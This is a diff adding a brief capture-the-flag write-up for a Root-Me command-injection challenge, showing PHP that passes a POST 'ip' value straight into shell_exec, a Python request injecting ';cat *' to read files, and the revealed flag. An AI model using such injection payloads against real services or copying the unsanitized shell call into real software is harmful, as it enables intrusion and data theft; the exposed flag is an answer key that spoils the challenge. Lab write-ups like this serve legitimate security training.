@@ -1,0 +1,16 @@
+Web Server Challenge 54 - Command Injection
+
+Synopsis:
+Find a vulnerabilty in this service and exploit it.
+The flag is on the index.php file.
+
+Vulnerable Code:
+if(isset($_POST["ip"]) && !empty($_POST["ip"])){
+        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
+        echo $response;
+}
+
+By appending ';' to ip value we are able to leverage command execution:
+
+>>> r = requests.post('http://challenge01.root-me.org/web-serveur/ch54/index.php', data={'ip':'127.0.0.1;cat *'})
+>>> re.findall('flag = *.*',r.content)                                                                   ['flag = "S3rv1ceP1n9Sup3rS3cure";']
